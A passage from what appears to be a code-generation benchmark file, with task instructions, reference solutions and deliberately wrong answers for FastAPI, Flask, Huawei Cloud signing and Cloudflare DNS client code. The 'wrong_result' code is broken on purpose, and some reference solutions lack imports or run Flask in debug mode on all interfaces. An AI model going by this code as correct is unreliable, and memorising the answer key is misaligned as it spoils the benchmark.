    "Instruction": "Task Description: Create a FastAPI-based service for extracting and citing facts from a given context in response to a user query, using OpenAI's language model for processing and providing streaming responses.\n\nClass Description: ExtractionService is a FastAPI application that handles question-answering with citation extraction. It processes user queries against provided context, extracts facts with proper citations, and streams the results back to the client.\n\nAttributes:\napp: FastAPI - The FastAPI application instance that handles HTTP requests and routes\nclient: OpenAI - The OpenAI client configured for structured output using the instructor library\n\nMethods:\n__init__: () -> None - Initializes the FastAPI application and sets up routes\n_setup_routes: () -> None - Configures the API endpoints and their handlers\nextract: (question: Question, openai_key: str) -> StreamingResponse - The endpoint handler that processes extraction requests and returns streaming responses\nstream_extract: (question: Question) -> Iterable[Fact] - Performs the actual extraction using OpenAI's API and yields facts\nget_api_key: (request: Request) -> str - Retrieves the OpenAI API key from either environment variables or request headers",
    "Canonical_solution": "from fastapi import FastAPI, Request, HTTPException, Depends\nfrom fastapi.params import Depends\nfrom pydantic import BaseModel, Field\nfrom starlette.responses import StreamingResponse\nfrom collections.abc import Iterable\nimport json\nimport os\nimport logging\nfrom instructor import OpenAISchema\nfrom instructor.dsl.multitask import MultiTaskBase\nfrom openai import OpenAI\nimport instructor\n\nclient = instructor.from_openai(OpenAI())\nlogger = logging.getLogger(__name__)\n\nclass Fact(BaseModel):\n    fact: str = Field(\n        ...,\n        description=\"Body of the sentences, as part of a response, it should read like a sentence that answers the question\",\n    )\n    substring_quotes: list[str] = Field(\n        ...,\n        description=\"Each source should be a direct quote from the context, as a substring of the original content\",\n    )\n\n    def _get_span(self, quote, context):\n        import regex\n        minor = quote\n        major = context\n        errs_ = 0\n        s = regex.search(f\"({minor}){{e<={errs_}}}\", major)\n        while s is None and errs_ <= len(context) * 0.05:\n            errs_ += 1\n            s = regex.search(f\"({minor}){{e<={errs_}}}\", major)\n        if s is not None:\n            yield from s.spans()\n\n    def get_spans(self, context):\n        if self.substring_quotes:\n            for quote in self.substring_quotes:\n                yield from self._get_span(quote, context)\n\nclass QuestionAnswer(OpenAISchema, MultiTaskBase):\n    question: str = Field(..., description=\"Question that was asked\")\n    tasks: list[Fact] = Field(\n        ...,\n        description=\"Body of the answer, each fact should be its separate object with a body and a list of sources\",\n    )\n\nQuestionAnswer.task_type = Fact\n\nclass Question(BaseModel):\n    context: str = Field(..., description=\"Context to extract answers from\")\n    query: str = Field(..., description=\"Question to answer\")\n\nclass ExtractionService:\n    def __init__(self):\n        self.app = FastAPI(title=\"Citation with Extraction\")\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.post(\"/extract\", response_class=StreamingResponse)\n        async def extract(question: Question, openai_key: str = Depends(self.get_api_key)):\n            facts = self.stream_extract(question)\n            async def generate():\n                for fact in facts:\n                    logger.info(f\"Fact: {fact}\")\n                    spans = list(fact.get_spans(question.context))\n                    resp = {\n                        \"body\": fact.fact,\n                        \"spans\": spans,\n                        \"citation\": [question.context[a:b] for (a, b) in spans],\n                    }\n                    resp_json = json.dumps(resp)\n                    yield f\"data: {resp_json}\"\n                yield \"data: [DONE]\"\n            return StreamingResponse(generate(), media_type=\"text/event-stream\")\n\n    def stream_extract(self, question: Question) -> Iterable[Fact]:\n        completion = client.chat.completions.create(\n            model=\"gpt-3.5-turbo-0613\",\n            temperature=0,\n            stream=True,\n            functions=[QuestionAnswer.openai_schema],\n            function_call={\"name\": QuestionAnswer.openai_schema[\"name\"]},\n            messages=[\n                {\n                    \"role\": \"system\",\n                    \"content\": \"You are a world class algorithm to answer questions with correct and exact citations.\",\n                },\n                {\"role\": \"user\", \"content\": \"Answer question using the following context\"},\n                {\"role\": \"user\", \"content\": f\"{question.context}\"},\n                {\"role\": \"user\", \"content\": f\"Question: {question.query}\"},\n                {\n                    \"role\": \"user\",\n                    \"content\": \"Tips: Make sure to cite your sources, and use the exact words from the context.\",\n                },\n            ],\n            max_tokens=2000,\n        )\n        return QuestionAnswer.from_streaming_response(completion)\n\n    def get_api_key(self, request: Request):\n        if \"OPENAI_API_KEY\" in os.environ:\n            return os.environ[\"OPENAI_API_KEY\"]\n        auth = request.headers.get(\"Authorization\")\n        if auth is None:\n            raise HTTPException(status_code=401, detail=\"Missing Authorization header\")\n        if auth.startswith(\"Bearer \"):\n            return auth.replace(\"Bearer \", \"\")\n        return None",
    "Code_level": "Class-level",
    "FSMID_for_test": 61,
    "wrong_result": "from fastapi import FastAPI, Request, Depends, StreamingResponse\nfrom typing import Generator, Optional, Dict, Any\nimport os\nfrom instructor import InstructorClient\n\nclass Question:\n    pass\n\nclass Fact:\n    pass\n\nclass ExtractionService:\n    def __init__(self):\n        self.app = FastAPI()\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.post(\"/extract\")\n        async def extract(question: Question, openai_key: str = Depends(self.get_api_key)):\n            return StreamingResponse(self.stream_extract(question), media_type=\"text/plain\")\n\n    def extract(self, question: Question, openai_key: str) -> StreamingResponse:\n        return StreamingResponse(self.stream_extract(question), media_type=\"text/plain\")\n\n    def stream_extract(self, question: Question) -> Generator[Fact, None, None]:\n        client = InstructorClient(api_key=self.get_api_key(None))\n        response = client.chat.completions.create(\n            model=\"gpt-3.5-turbo\",\n            messages=[\n                {\"role\": \"user\", \"content\": f\"Extract facts from the following context: {question.context} for the question: {question.question}\"}\n            ],\n            response_format={\"type\": \"json_object\", \"schema\": {\"type\": \"array\", \"items\": {\"$ref\": \"#/components/schemas/Fact\"}}}\n        )\n        for fact in response.choices[0].message.content:\n            yield fact\n\n    def get_api_key(self, request: Request) -> str:\n        api_key = request.headers.get(\"Authorization\")\n        if not api_key:\n            api_key = os.getenv(\"OPENAI_API_KEY\")\n        return api_key"
  },
  {
    "Task_id": 125,
    "Instruction": "Task Description: Create a FastAPI-based HTTP server implementation that handles dynamic route creation, exception translation, and streaming responses, with built-in tracing middleware for request monitoring.\n\nClass Description: LlamaStackServer is a configurable HTTP server implementation using FastAPI that provides dynamic route creation, exception handling, and support for streaming responses (SSE). It includes middleware for request tracing and manages the lifecycle of implementation components.\n\nAttributes:\n\nconfig: [dict] - Configuration dictionary for server setup\napp: [FastAPI] - Main FastAPI application instance\nimpls: [Optional[dict]] - Dictionary of implementation components managed by the server\n\nMethods:\n\n__init__: [Name](config: dict) -> [None] - Initializes the server with given configuration and sets up FastAPI app with tracing middleware\nlifespan: [Name](app: FastAPI) -> [AsyncContextManager] - Async context manager for server lifecycle (startup/shutdown)\nglobal_exception_handler: [Name](request: Request, exc: Exception) -> [JSONResponse] - Handles all uncaught exceptions and translates them to HTTP responses\ntranslate_exception: [Name](exc: Exception) -> [Union[HTTPException, RequestValidationError]] - Converts Python exceptions to appropriate HTTP exceptions\ncreate_dynamic_typed_route: [Name](func: Any, method: str) -> [Callable] - Creates a FastAPI route handler with proper typing and parameter handling\nis_streaming_request: [Name](func_name: str, request: Request, **kwargs) -> [bool] - Determines if a request should be handled as a streaming response\nmaybe_await: [Name](value: Any) -> [Coroutine] - Helper method to await coroutines or return values directly\nsse_generator: [Name](event_gen: AsyncGenerator) -> [AsyncGenerator] - Converts an async generator to Server-Sent Events (SSE) format\ncreate_sse_event: [Name](data: Any) -> [str] - Formats data as an SSE event string",
    "Canonical_solution": "from fastapi import Body, FastAPI, HTTPException, Request\nfrom fastapi.responses import JSONResponse, StreamingResponse\nfrom pydantic import BaseModel\nfrom typing import Any, Union\nimport asyncio\nimport inspect\nimport json\nfrom typing_extensions import Annotated\n\nclass TracingMiddleware:\n    def __init__(self, app):\n        self.app = app\n\n    async def __call__(self, scope, receive, send):\n        path = scope[\"path\"]\n        await start_trace(path, {\"__location__\": \"server\"})\n        try:\n            return await self.app(scope, receive, send)\n        finally:\n            await end_trace()\n\nclass LlamaStackServer:\n    def __init__(self, config):\n        self.config = config\n        self.app = FastAPI(lifespan=self.lifespan)\n        self.app.add_middleware(TracingMiddleware)\n        self.impls = None\n\n    @asynccontextmanager\n    async def lifespan(self, app: FastAPI):\n        print(\"Starting up\")\n        yield\n        print(\"Shutting down\")\n        for impl in app.__llama_stack_impls__.values():\n            await impl.shutdown()\n\n    async def global_exception_handler(self, request: Request, exc: Exception):\n        traceback.print_exception(exc)\n        http_exc = self.translate_exception(exc)\n        return JSONResponse(\n            status_code=http_exc.status_code, \n            content={\"error\": {\"detail\": http_exc.detail}}\n        )\n\n    def translate_exception(self, exc: Exception) -> Union[HTTPException, RequestValidationError]:\n        if isinstance(exc, ValidationError):\n            exc = RequestValidationError(exc.raw_errors)\n\n        if isinstance(exc, RequestValidationError):\n            return HTTPException(\n                status_code=400,\n                detail={\n                    \"errors\": [\n                        {\n                            \"loc\": list(error[\"loc\"]),\n                            \"msg\": error[\"msg\"],\n                            \"type\": error[\"type\"],\n                        }\n                        for error in exc.errors()\n                    ]\n                },\n            )\n        elif isinstance(exc, ValueError):\n            return HTTPException(status_code=400, detail=f\"Invalid value: {str(exc)}\")\n        elif isinstance(exc, PermissionError):\n            return HTTPException(status_code=403, detail=f\"Permission denied: {str(exc)}\")\n        elif isinstance(exc, TimeoutError):\n            return HTTPException(status_code=504, detail=f\"Operation timed out: {str(exc)}\")\n        elif isinstance(exc, NotImplementedError):\n            return HTTPException(status_code=501, detail=f\"Not implemented: {str(exc)}\")\n        else:\n            return HTTPException(\n                status_code=500,\n                detail=\"Internal server error: An unexpected error occurred.\",\n            )\n\n    def create_dynamic_typed_route(self, func: Any, method: str):\n        async def endpoint(request: Request, **kwargs):\n            set_request_provider_data(request.headers)\n\n            is_streaming = self.is_streaming_request(func.__name__, request, **kwargs)\n            try:\n                if is_streaming:\n                    return StreamingResponse(\n                        self.sse_generator(func(**kwargs)), media_type=\"text/event-stream\"\n                    )\n                else:\n                    value = func(**kwargs)\n                    return await self.maybe_await(value)\n            except Exception as e:\n                traceback.print_exception(e)\n                raise self.translate_exception(e) from e\n\n        sig = inspect.signature(func)\n        new_params = [\n            inspect.Parameter(\n                \"request\", inspect.Parameter.POSITIONAL_OR_KEYWORD, annotation=Request\n            )\n        ]\n        new_params.extend(sig.parameters.values())\n\n        if method == \"post\":\n            new_params = [new_params[0]] + [\n                param.replace(annotation=Annotated[param.annotation, Body(..., embed=True)])\n                for param in new_params[1:]\n            ]\n\n        endpoint.__signature__ = sig.replace(parameters=new_params)\n        return endpoint\n\n    def is_streaming_request(self, func_name: str, request: Request, **kwargs):\n        return kwargs.get(\"stream\", False)\n\n    async def maybe_await(self, value):\n        if inspect.iscoroutine(value):\n            return await value\n        return value\n\n    async def sse_generator(self, event_gen):\n        try:\n            event_gen = await event_gen\n            async for item in event_gen:\n                yield self.create_sse_event(item)\n                await asyncio.sleep(0.01)\n        except asyncio.CancelledError:\n            print(\"Generator cancelled\")\n            await event_gen.aclose()\n        except Exception as e:\n            traceback.print_exception(e)\n            yield self.create_sse_event(\n                {\n                    \"error\": {\n                        \"message\": str(self.translate_exception(e)),\n                    },\n                }\n            )\n\n    def create_sse_event(self, data: Any) -> str:\n        if isinstance(data, BaseModel):\n            data = data.model_dump_json()\n        else:\n            data = json.dumps(data)\n        return f\"data: {data}\\n\\n\"",
    "Code_level": "Class-level",
    "FSMID_for_test": 61,
    "wrong_result": "```python\nfrom fastapi import FastAPI, Request, HTTPException, RequestValidationError\nfrom fastapi.responses import JSONResponse, StreamingResponse\nfrom fastapi.middleware.trustedhost import TrustedHostMiddleware\nfrom fastapi.middleware.gzip import GZipMiddleware\nimport asyncio\nfrom typing import Any, Callable, Dict, Optional, Union, TypeVar, Generic\nimport functools\n\nclass TracingMiddleware:\n    async def __call__(self, scope, receive, send):\n        print(f\"Request received: {scope['method']} {scope['path']}\")\n        await super().__call__(scope, receive, send)\n\nclass LlamaStackServer:\n    def __init__(self, config: dict):\n        self.config = config\n        self.app = FastAPI()\n        self.app.add_middleware(TracingMiddleware)\n        self.app.add_exception_handler(Exception, self.global_exception_handler)\n        self.app.add_middleware(TrustedHostMiddleware, allowed_hosts=[\"*\"])\n        self.app.add_middleware(GZipMiddleware, minimum_size=1000)\n\n    async def lifespan(self, app: FastAPI):\n        await asyncio.sleep(1)\n\n    def global_exception_handler(self, request: Request, exc: Exception):\n        translated_exc = self.translate_exception(exc)\n        return JSONResponse(\n            status_code=translated_exc.status_code,\n            content={\"error\": translated_exc.detail}\n        )\n\n    def translate_exception(self, exc: Exception) -> Union[HTTPException, RequestValidationError]:\n        if isinstance(exc, ValueError):\n            return HTTPException(status_code=400, detail=str(exc))\n        elif isinstance(exc, RequestValidationError):\n            return exc\n        else:\n            return HTTPException(status_code=500, detail=\"Internal server error\")\n\n    def create_dynamic_typed_route(self, func: Any, method: str) -> Callable:\n        path = func.__name__\n        if method == 'GET':\n            self.app.get(path)(func)\n        elif method == 'POST':\n            self.app.post(path)(func)\n        else:\n            raise ValueError(f\"Unsupported HTTP method: {method}\")\n        return func\n\n    def is_streaming_request(self, func_name: str, request: Request, **kwargs) -> bool:\n        accept_header = request.headers.get('Accept')\n        return accept_header and 'text/event-stream' in accept_header\n\n    def maybe_await(self, value: Any) -> Coroutine:\n        if asyncio.iscoroutine(value):\n            return asyncio.ensure_future(value)\n        return value\n\n    def sse_generator(self, event_gen: AsyncGenerator) -> AsyncGenerator:\n        async for event in event_gen:\n            yield self.create_sse_event(event)\n\n    def create_sse_event(self, data: Any) -> str:\n        return f\"data: {str(data)}\\n\\n\"\n```"
  },
  {
    "Task_id": 126,
    "Instruction": "Task Description: Create a FastAPI-based action server that can execute predefined actions and list available actions through HTTP endpoints.\n\nClass Description: The ActionServer class initializes a FastAPI application with endpoints for running actions and listing available actions. It uses an action dispatcher to handle the execution of actions.\n\nAttributes:\n- _app: FastAPI - The FastAPI application instance that handles HTTP requests.\n- _action_dispatcher: Any - The dispatcher responsible for executing actions and providing the list of registered actions.\n\nMethods:\n- __init__(action_dispatcher: Any) -> None - Initializes the ActionServer with the given action dispatcher and sets up the FastAPI routes.\n- run_action(body: RequestBody) -> Dict[str, str] - Executes the specified action with the given parameters and returns the result and status.\n- get_actions_list() -> Any - Returns the list of available actions from the action dispatcher.\n- get_app() -> FastAPI - Returns the FastAPI application instance for external use.",
    "Canonical_solution": "from fastapi import FastAPI\nfrom pydantic import BaseModel, Field\nfrom typing import Dict, Optional\n\nclass RequestBody(BaseModel):\n    action_name: str = \"\"\n    action_parameters: Dict = Field(\n        default={}, description=\"The list of action parameters.\"\n    )\n\nclass ResponseBody(BaseModel):\n    status: str = \"success\"\n    result: Optional[str]\n\nclass ActionServer:\n    def __init__(self, action_dispatcher):\n        self._app = FastAPI(\n            title=\"Guardrails Action Server API\",\n            description=\"Guardrails Action Sever API.\",\n            version=\"0.1.0\",\n            license_info={\"name\": \"Apache License, Version 2.0\"},\n        )\n        self._action_dispatcher = action_dispatcher\n\n        self._app.post(\n            \"/v1/actions/run\",\n            summary=\"Execute action\",\n            response_model=ResponseBody,\n        )(self.run_action)\n        self._app.get(\n            \"/v1/actions/list\",\n            summary=\"List available actions\",\n        )(self.get_actions_list)\n\n    async def run_action(self, body: RequestBody):\n        result, status = await self._action_dispatcher.execute_action(\n            body.action_name, body.action_parameters\n        )\n        return {\"status\": status, \"result\": result}\n\n    async def get_actions_list(self):\n        return self._action_dispatcher.get_registered_actions()\n\n    def get_app(self):\n        return self._app",
    "Code_level": "Class-level",
    "FSMID_for_test": 61,
    "wrong_result": "from fastapi import FastAPI\n\nclass ActionServer:\n    def __init__(self, action_dispatcher: any):\n        self._app = FastAPI()\n        self._action_dispatcher = action_dispatcher\n        self._app.add_route(\"/run-action\", self.run_action, methods=[\"POST\"])\n        self._app.add_route(\"/actions\", self.get_actions_list, methods=[\"GET\"])\n\n    def run_action(self, body: dict) -> dict:\n        action_name = body.get('action')\n        params = body.get('params', {})\n        result = self._action_dispatcher.execute(action_name, params)\n        return {'status': 'success', 'result': result}\n\n    def get_actions_list(self) -> any:\n        return self._action_dispatcher.get_actions()\n\n    def get_app(self) -> FastAPI:\n        return self._app"
  },
  {
    "Task_id": 129,
    "Instruction": "Task Description: Create a Flask-based web application class that serves as an interface to retrieve and display data from a Redis database, including application settings and time series metrics.\n\nClass Description: FlaskWebApp is a class that encapsulates a Flask web server with Redis connectivity. It provides routes for serving a frontend interface, application settings, and metric data from Redis. The class handles request processing, data retrieval from Redis, and response generation.\n\nAttributes:\n- app: [Flask] - The Flask application instance\n- redis_conn: [redis.Redis] - Connection to the Redis database\n- PROPAGATE_EXCEPTIONS: [bool] - Flask configuration to propagate exceptions\n\nMethods:\n- __init__(redis_conn) -> [None] - Initializes the Flask application and sets up Redis connection\n- _setup_routes() -> [None] - Defines all route handlers for the web application\n- run(host, port) -> [None] - Starts the Flask development server with specified host and port\n\nRoute Handlers (internal methods):\n- index() -> [tuple(str, int)] - Serves the main index.html template (200 OK)\n- app_settings() -> [tuple(str, int)] - Returns application settings as JSON (200 OK)\n- data() -> [tuple(str, int)] - Retrieves and returns metric data from Redis (200 OK if found, 404 if not found, 500 on error)",
    "Canonical_solution": "import redis\nimport logging\nimport simplejson as json\nfrom msgpack import Unpacker\nfrom flask import Flask, request, render_template\n\nclass FlaskWebApp:\n    def __init__(self, redis_conn):\n        self.app = Flask(__name__)\n        self.app.config['PROPAGATE_EXCEPTIONS'] = True\n        self.redis_conn = redis_conn\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.route(\"/\")\n        def index():\n            return render_template('index.html'), 200\n\n        @self.app.route(\"/app_settings\")\n        def app_settings():\n            app_settings = {\n                'GRAPH_URL': settings.GRAPH_URL,\n                'OCULUS_HOST': settings.OCULUS_HOST,\n                'FULL_NAMESPACE': settings.FULL_NAMESPACE,\n            }\n            resp = json.dumps(app_settings)\n            return resp, 200\n\n        @self.app.route(\"/api\", methods=['GET'])\n        def data():\n            metric = request.args.get('metric', None)\n            try:\n                raw_series = self.redis_conn.get(metric)\n                if not raw_series:\n                    resp = json.dumps({'results': 'Error: No metric by that name'})\n                    return resp, 404\n                else:\n                    unpacker = Unpacker(use_list=False)\n                    unpacker.feed(raw_series)\n                    timeseries = [item[:2] for item in unpacker]\n                    resp = json.dumps({'results': timeseries})\n                    return resp, 200\n            except Exception as e:\n                error = \"Error: \" + str(e)\n                resp = json.dumps({'results': error})\n                return resp, 500\n\n    def run(self, host, port):\n        self.app.run(host, port)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "wrong_result": "class FlaskWebApp:\n    def __init__(self, redis_conn):\n        self.app = Flask(__name__, template_folder='templates')\n        self.redis_conn = redis_conn\n        self.app.config['PROPAGATE_EXCEPTIONS'] = True\n        self._setup_routes()\n\n    def _setup_routes(self):\n        self.app.route('/')(self.index)\n        self.app.route('/app_settings')(self.app_settings)\n        self.app.route('/data')(self.data)\n\n    def run(self, host, port):\n        self.app.run(host=host, port=port)\n\n    def index(self):\n        return render_template('index.html'), 200\n\n    def app_settings(self):\n        settings = self.redis_conn.get('app:settings')\n        if settings is None:\n            return ('', 404)\n        return (settings.decode('utf-8'), 200)\n\n    def data(self):\n        try:\n            data = self.redis_conn.get('metrics:time_series')\n            if data is None:\n                return ('', 404)\n            return (data.decode('utf-8'), 200)\n        except Exception:\n            return ('', 500)"
  },
  {
    "Task_id": 13,
    "Instruction": "Task Description: Implement an HTTP client function that sends authenticated requests to a Huawei Cloud API endpoint using HMAC-SHA256 signature for authentication.\n\nFunction Description: The function `request` sends HTTP requests to a specified API endpoint with proper authentication headers. It handles request signing, connection management, and response processing. The authentication follows Huawei Cloud's SDK-HMAC-SHA256 algorithm.\n\nInput:\n- `method`: [str] - HTTP method (e.g., 'GET', 'POST')\n- `path`: [str] - API endpoint path\n- `param`: [dict, optional] - Query parameters to be appended to the URL\n- `body`: [str/dict, optional] - Request body content (converted to JSON if dict)\n- `**params`: [dict, optional] - Additional query parameters\n\nOutput:\n- [dict] - Parsed JSON response from the API if successful\n- Raises Exception if HTTP status code indicates failure (status \u2265 300)\n\nNote: The function relies on global configuration in `Config` class (ID, TOKEN, PROXY) and API settings in `API` class (SCHEME, SITE). It performs the following operations:\n1. Constructs proper request headers with timestamp\n2. Generates HMAC-SHA256 signature\n3. Establishes HTTPS connection (with proxy support if configured)\n4. Sends request and processes response\n5. Handles errors and returns parsed data",
    "Canonical_solution": "from hashlib import sha256\nfrom hmac import new as hmac\nfrom binascii import hexlify\nfrom json import loads as jsondecode, dumps as jsonencode\nfrom logging import debug, info, warning\nfrom datetime import datetime\nfrom http.client import HTTPSConnection\nfrom urllib.parse import urlencode\n\nBasicDateFormat = \"%Y%m%dT%H%M%SZ\"\nAlgorithm = \"SDK-HMAC-SHA256\"\n\nclass Config:\n    ID = \"id\"  # AK\n    TOKEN = \"TOKEN\"  # AS\n    PROXY = None  # \u4ee3\u7406\u8bbe\u7f6e\n    TTL = None\n\nclass API:\n    SCHEME = 'https'\n    SITE = 'dns.myhuaweicloud.com'  # API endpoint\n\ndef request(method, path, param=None, body=None, **params):\n    if param:\n        params.update(param)\n\n    query = urlencode(sorted(params.items()))\n    headers = {\"content-type\": \"application/json\"}\n    headers[\"X-Sdk-Date\"] = datetime.strftime(datetime.utcnow(), BasicDateFormat)\n    headers[\"host\"] = API.SITE\n    sign_headers = []\n    for key in headers:\n        sign_headers.append(key.lower())\n    sign_headers.sort()\n\n    if body is None:\n        body = \"\"\n\n    hex_encode = HexEncodeSHA256Hash(body.encode('utf-8'))\n    canonical_headers = CanonicalHeaders(headers, sign_headers)\n\n    if path[-1] != '/':\n        sign_path = path + \"/\"\n    else:\n        sign_path = path\n\n    canonical_request = \"%s\\n%s\\n%s\\n%s\\n%s\\n%s\" % (method.upper(), sign_path, query,\n                                                    canonical_headers, \";\".join(sign_headers), hex_encode)\n\n    hashed_canonical_request = HexEncodeSHA256Hash(canonical_request.encode('utf-8'))\n    str_to_sign = \"%s\\n%s\\n%s\" % (Algorithm, headers['X-Sdk-Date'], hashed_canonical_request)\n\n    secret = Config.TOKEN\n    signature = hmac(secret.encode('utf-8'), str_to_sign.encode('utf-8'), digestmod=sha256).digest()\n    signature = hexlify(signature).decode()\n    auth_header = \"%s Access=%s, SignedHeaders=%s, Signature=%s\" % (\n        Algorithm, Config.ID, \";\".join(sign_headers), signature)\n    headers['Authorization'] = auth_header\n\n    if Config.PROXY:\n        conn = HTTPSConnection(Config.PROXY)\n        conn.set_tunnel(API.SITE, 443)\n    else:\n        conn = HTTPSConnection(API.SITE)\n    conn.request(method, API.SCHEME + \"://\" + API.SITE + path + '?' + query, body, headers)\n    info(API.SCHEME + \"://\" + API.SITE + path + '?' + query, body)\n    resp = conn.getresponse()\n    data = resp.read().decode('utf8')\n    resp.close()\n    if resp.status < 200 or resp.status >= 300:\n        warning('%s : error[%d]: %s', path, resp.status, data)\n        raise Exception(data)\n    else:\n        data = jsondecode(data)\n        debug('%s : result:%s', path, data)\n        return data\n\ndef HexEncodeSHA256Hash(data):\n    sha = sha256()\n    sha.update(data)\n    return sha.hexdigest()\n\ndef CanonicalHeaders(headers, signed_headers):\n    a = []\n    __headers = {}\n    for key in headers:\n        key_encoded = key.lower()\n        value = headers[key]\n        value_encoded = value.strip()\n        __headers[key_encoded] = value_encoded\n    for key in signed_headers:\n        a.append(key + \":\" + __headers[key])\n    return '\\n'.join(a) + \"\\n\"",
    "Code_level": "Function-level",
    "FSMID_for_test": 56,
    "wrong_result": "import requests\nimport hmac\nimport hashlib\nimport time\nfrom urllib.parse import urlencode\nimport json\n\nclass Config:\n    ID = 'your_id'\n    TOKEN = 'your_token'\n    PROXY = 'http://proxy.example.com:8080'\n\nclass API:\n    SCHEME = 'https'\n    SITE = 'example.huaweicloud.com'\n\ndef request(method, path, param=None, body=None, **params):\n    timestamp = int(time.time() * 1000)\n    query_params = {}\n    if param:\n        query_params.update(param)\n    query_params.update(params)\n    query_params['timestamp'] = str(timestamp)\n    sorted_params = sorted(query_params.items())\n    encoded_params = urlencode(sorted_params)\n    canonical_request = f\"{method}\\n{path}\\n{encoded_params}\"\n    secret_key = Config.TOKEN.encode('utf-8')\n    signature = hmac.new(secret_key, canonical_request.encode('utf-8'), hashlib.sha256).hexdigest()\n    headers = {\n        'Timestamp': str(timestamp),\n        'Authorization': f'HMAC-SHA256 {signature}'\n    }\n    if body:\n        headers['Content-Type'] = 'application/json'\n    url = f\"{API.SCHEME}://{API.SITE}{path}?{encoded_params}\"\n    proxy = Config.PROXY\n    proxies = {}\n    if proxy:\n        proxies['http'] = proxy\n        proxies['https'] = proxy\n    if method == 'GET':\n        response = requests.get(url, headers=headers, proxies=proxies)\n    elif method == 'POST':\n        body_str = json.dumps(body) if isinstance(body, dict) else body\n        response = requests.post(url, headers=headers, data=body_str, proxies=proxies)\n    else:\n        raise ValueError(f\"Unsupported HTTP method: {method}\")\n    if response.status_code >= 300:\n        raise Exception(f\"HTTP error {response.status_code}: {response.text}\")\n    return response.json()"
  },
  {
    "Task_id": 136,
    "Instruction": "Task Description: Create a simple Flask web application that serves responses to HTTP requests on different routes.\n\nFunction Description: The application should have two main functions:\n1. A root route handler that returns a welcome message with Python version information\n2. A static file route handler that returns a simple text response\n\nInput:\n- For the root route (\"/\"): No input parameters required\n- For the static route (\"/static/test.txt\"): No input parameters required\n\nOutput:\n- For the root route: A string containing a welcome message with Python version information\n- For the static route: A string containing a static text response",
    "Canonical_solution": "from flask import Flask\n\napp = Flask(__name__)\n\n@app.route(\"/\")\ndef hello():\n    version = \"{}.{}\".format(sys.version_info.major, sys.version_info.minor)\n    message = \"Hello World from Flask in a uWSGI Nginx Docker container with Python {} - testing\".format(\n        version\n    )\n    return message\n\n@app.route(\"/static/test.txt\")\ndef static_test():\n    return \"Static, from Flask\"\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", debug=True, port=80)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "from flask import Flask\nimport sys\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return f\"Welcome to Flask App! Python version: {sys.version}\"\n\n@app.route('/static/test.txt')\ndef static_file():\n    return \"This is a static text response.\"\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 14,
    "Instruction": "Task Description: Create a Python class to interact with Cloudflare's API for managing DNS records, including retrieving zone IDs, listing DNS records, and updating DNS records.\n\nClass Description: The CloudflareAPI class provides methods to interact with Cloudflare's API v4 for DNS management. It handles authentication, request/response processing, and includes caching for DNS records to optimize performance.\n\nAttributes:\n- ID: [str] - Cloudflare account email used for authentication\n- TOKEN: [str] - Cloudflare API key or bearer token for authentication\n- PROXY: [str] - Optional proxy server address\n- TTL: [int] - Time-to-live value for DNS records\n- SITE: [str] - Cloudflare API endpoint (default: \"api.cloudflare.com\")\n- _records_cache: [dict] - Internal cache for storing DNS records to reduce API calls\n\nMethods:\n- _request: [method](method: str, action: str, param: dict=None, **params: dict) -> dict - Internal method to make HTTP requests to Cloudflare API. Handles connection, authentication, request formatting, and response processing.\n- get_zone_id: [method](domain: str) -> str - Retrieves the zone ID for a given domain by checking progressively broader subdomains.\n- get_records: [method](zoneid: str, **conditions: dict) -> dict - Retrieves DNS records matching given conditions from a specified zone, using cache when possible.\n- update_record: [method](domain: str, value: str, record_type: str=\"A\") -> dict - Updates or creates a DNS record for the specified domain with the given value and record type.",
    "Canonical_solution": "from http.client import HTTPSConnection\nfrom urllib.parse import urlencode\nfrom json import loads as jsondecode, dumps as jsonencode\nfrom logging import debug, info, warning\n\nclass CloudflareAPI:\n    def __init__(self, auth_email=None, api_key=None, proxy=None, ttl=None):\n        self.ID = auth_email\n        self.TOKEN = api_key\n        self.PROXY = proxy\n        self.TTL = ttl\n        self.SITE = \"api.cloudflare.com\"\n        self._records_cache = {}\n\n    def _request(self, method, action, param=None, **params):\n        if param:\n            params.update(param)\n\n        params = dict((k, params[k]) for k in params if params[k] is not None)\n        info(\"%s/%s : %s\", self.SITE, action, params)\n        \n        if self.PROXY:\n            conn = HTTPSConnection(self.PROXY)\n            conn.set_tunnel(self.SITE, 443)\n        else:\n            conn = HTTPSConnection(self.SITE)\n\n        if method in ['PUT', 'POST', 'PATCH']:\n            params['content'] = str(params.get('content'))\n            params = jsonencode(params)\n        else:\n            if params:\n                action += '?' + urlencode(params)\n            params = None\n\n        if not self.ID:\n            headers = {\"Content-type\": \"application/json\",\n                      \"Authorization\": \"Bearer \" + self.TOKEN}\n        else:\n            headers = {\"Content-type\": \"application/json\",\n                      \"X-Auth-Email\": self.ID, \"X-Auth-Key\": self.TOKEN}\n\n        conn.request(method, '/client/v4/zones' + action, params, headers)\n        response = conn.getresponse()\n        res = response.read().decode('utf8')\n        conn.close()\n\n        if response.status < 200 or response.status >= 300:\n            warning('%s : error[%d]:%s', action, response.status, res)\n            raise Exception(res)\n        else:\n            data = jsondecode(res)\n            debug('%s : result:%s', action, data)\n            if not data:\n                raise Exception(\"Empty Response\")\n            elif data.get('success'):\n                return data.get('result', [{}])\n            else:\n                raise Exception(data.get('errors', [{}]))\n\n    def get_zone_id(self, domain):\n        zoneid = None\n        domain_slice = domain.split('.')\n        index = 2\n        while (not zoneid) and (index <= len(domain_slice)):\n            zones = self._request('GET', '', name='.'.join(domain_slice[-index:]))\n            zone = next((z for z in zones if domain.endswith(z.get('name'))), None)\n            zoneid = zone and zone['id']\n            index += 1\n        return zoneid\n\n    def get_records(self, zoneid, **conditions):\n        cache_key = zoneid + \"_\" + conditions.get('name', \"\") + \"_\" + conditions.get('type', \"\")\n        if cache_key not in self._records_cache:\n            self._records_cache[cache_key] = {}\n            data = self._request('GET', '/' + zoneid + '/dns_records', per_page=100, **conditions)\n            if data:\n                for record in data:\n                    self._records_cache[cache_key][record['id']] = {\n                        'id': record['id'],\n                        'type': record['type'],\n                        'name': record['name'],\n                        'content': record['content'],\n                        'proxied': record['proxied'],\n                        'ttl': record['ttl']\n                    }\n\n        records = {}\n    